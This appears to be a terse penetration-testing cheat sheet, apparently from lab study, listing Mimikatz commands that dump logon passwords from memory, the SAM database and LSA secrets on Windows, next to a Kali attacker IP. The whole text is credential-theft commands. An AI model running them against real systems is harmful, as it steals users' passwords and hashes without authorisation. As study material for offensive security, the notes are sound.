---
IP_KALI: 192.168.45.155
---
Run mimikatz:
```
.\mimikatz.exe
```
```
privilege::debug
```
```
sekurlsa::logonpasswords
```
```
.\mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit"
```

Sam dump:
```
token::elevate
```
```
lsa::samdump
```

Dump secrets:
```
lsadump::secrets
```
```
.\mimikatz.exe "privilege::debug" "log" "lsadump::secrets" "exit"
```

Workaround for infinite printing of "#mimikatz" error:
Pass all commands as arguments
```
.\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"
```